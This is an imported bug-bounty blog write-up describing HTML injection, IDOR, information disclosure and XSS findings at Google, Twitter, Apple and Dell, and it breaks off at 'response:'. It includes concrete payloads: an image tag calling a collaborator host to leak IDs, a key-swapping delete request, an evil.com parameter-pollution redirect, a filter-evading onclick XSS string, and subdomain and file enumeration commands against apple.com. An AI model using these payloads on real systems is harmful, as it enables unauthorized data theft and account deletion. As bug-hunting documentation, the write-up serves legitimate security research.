---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-02-03_play-with-google-twitter-apple-dell.md
original_filename: 2023-02-03_play-with-google-twitter-apple-dell.md
title: Play with Google, Twitter, Apple, Dell
category: documents
detected_topics:
- idor
- xss
- information-disclosure
- access-control
- command-injection
- rate-limit
tags:
- imported
- documents
- idor
- xss
- information-disclosure
- access-control
- command-injection
- rate-limit
language: en
raw_sha256: b4bee8eed9e4083862f32375bec4d3e5e83683056098464956dd492a9d3ebe5c
text_sha256: a633d5cc924dc5b9e5bad7c6026ad7d1156d806c5e204be358eac9f05eb97be7
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# Play with Google, Twitter, Apple, Dell

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-02-03_play-with-google-twitter-apple-dell.md
- Source Type: markdown
- Detected Topics: idor, xss, information-disclosure, access-control, command-injection, rate-limit
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `b4bee8eed9e4083862f32375bec4d3e5e83683056098464956dd492a9d3ebe5c`
- Text SHA256: `a633d5cc924dc5b9e5bad7c6026ad7d1156d806c5e204be358eac9f05eb97be7`


## Content

---
title: "Play with Google, Twitter, Apple, Dell"
url: "https://medium.com/@rezaduty/play-with-google-twitter-apple-dell-a90777faa779"
authors: ["rezaduty (@rezaduty)"]
programs: ["Google", "Twitter", "Apple", "Dell"]
bugs: ["XSS", "HTML injection", "IDOR", "Information disclosure"]
publication_date: "2023-02-03"
added_date: "2023-02-13"
source: "pentester.land/writeups.json"
original_index: 1582
scraped_via: "browseros"
---

# Play with Google, Twitter, Apple, Dell

Play with Google, Twitter, Apple, Dell
rezaduty
4 min read
·
Feb 3, 2023

--

--

Press enter or click to view image in full size

This story of how I find vulnerabilities in google, Twitter, apple, and dell for fun after more than 40 tries

Google
Press enter or click to view image in full size

What is HTTP referer

The Referer request header contains the address of the page making the request. When following a link, this would be the url of the page containing the link. When making AJAX requests to another domain, this would be your page's url. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching, for example.

I found an HTML injection vulnerability and can steal the project id or user id in the referer.

first, send a post request like that

POST /v1/project/contact HTTP/1.1
Host: *.google1.com

{“name”:”test”}

I try to insert html tag and sending a request

POST /v1/project/contact HTTP/1.1
Host: *.google1.com

{“name”:”%3ch1%3eATTACK@aaa.com%3c%2fh1%3e”}

change %3c to <, %2f to /and %3e > then send request and show response.

To increase impact, we can insert html tag to send request to the attacker host with project properties like project id or any sensitive information in URL

{“name”:”%3cpre%3e%3cimg src=\”burpcollaborator\”%3e%3c%2fpre%3e”}

then send a request and show the result in burpcollaborator.

Press enter or click to view image in full size
Twitter

What is IDOR

“ Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability, attackers can bypass authorization and access resources in the system directly, for example, database records or files. Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.”

I found idor vulnerability in join to team functionality.

for example, userA with the administrator role can invite userB by email then userB receives a confirmation email and activate the account.

after userB joins to team userA can delete them.

delete requests like that

403->200

change word

POST /v1/team/delete HTTP/1.1
Host: *.twitter1.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

{“key”:”2aff454c5bd741e5b82b777e95584a61”}

try to change the key and send a request… SUCCESS

response like that

HTTP/1.1 204 No Content
cache-control: no-store
connection: close
content-length: 0

To increase impact should find user key.

hunt for key

user settings URL like that

https://twitter1.com/user/2aff454c5bd741e5b82b777e95584a61/

in the share profile functionality we can share profile

https://www.twitter1.com/shareProfile?mini=true&url=https://twitter.com/user/2aff454c5bd741e5b82b777e95584a61/?id=1

now try for parameter pollution vulnerability with insert &u=evil.com payload

https://twitter1.com/user/2aff454c5bd741e5b82b777e95584a61/?id=1&u=https%3a%2f%2fevil.com

after sending request

Get rezaduty’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://www.twitter1.com/shareProfile?mini=true&url=https://twitter1.com/user/2aff454c5bd741e5b82b777e95584a61/?id=1&u=https%3a%2f%2fevil.com/user/2aff454c5bd741e5b82b777e95584a61/

show response

https://evil.com/user/2aff454c5bd741e5b82b777e95584a61/

now getting the user key and deleting any user with any permission.

next target plz..

Apple

What is Information leakage?

Information leakage and improper error handling happen when web applications do not limit the amount of information they return to their users

1-first subdomain enumeration uses gobuster and assetfinder

gobuster dns -t 50 -d apple.com -w ~/seclists/Dir/subdomains.dat — wildcard

+

./assetfinder -subs-only apple.com | ./httprobe

2-find a subdomain with a 404 default page

let’s go for find directory enumeration

first use opendoor

python opendoor.py -t 45 — host https://dev.dev.apple.com/

found 3 directories with 403 status

3-file enumeration in 403 directory

./ffuf -w ~/seclists/Discovery/Web-Content/raft-large-files.txt -u https://dev.dev.apple.com/TEST/FUZZ

find a file with js file included in the header empty in the body

getJS — url https://dev.dev.apple.com/TEST/kb.html

4. let’s go for find interested parameter for bug hunter in js file

python linkfinder.py -i https://dev.dev.apple.com/TEST/static/js/239746.js > list.txt

finally capture screenshot of URL for find good data

python webscreenshot.py -i list.txt -v

verbose error here

Press enter or click to view image in full size
Dell

What is XSS

Cross site scripting (henceforth referred to as XSS) is one of those attacks that’s both extremely prevalent (remember, it’s number 2 on the OWASP Top 10) and frequently misunderstood. You’ll very often see some attempt at mitigating the risk but then find it’s easily circumvented because the developers weren’t fully aware of the attack vectors.

in the dell application, we can search between tags such as

https://dev.dell1.com/search.html?t=keyword,PAYLOAD

but <script>alert(1)</script> or “ onclick=alert(1) detect and blocked

after testing another payload result like that

‘ -> Space
“” -> “
(( -> (
)) -> )

so try this payload example””’onclick=””confirm((1))”” ’ ”” and set in url

https://dev.dell1.com/content/search.html?t=On Demand Class,On Demand Lab,example””’onclick=””confirm((1))””’””

response:
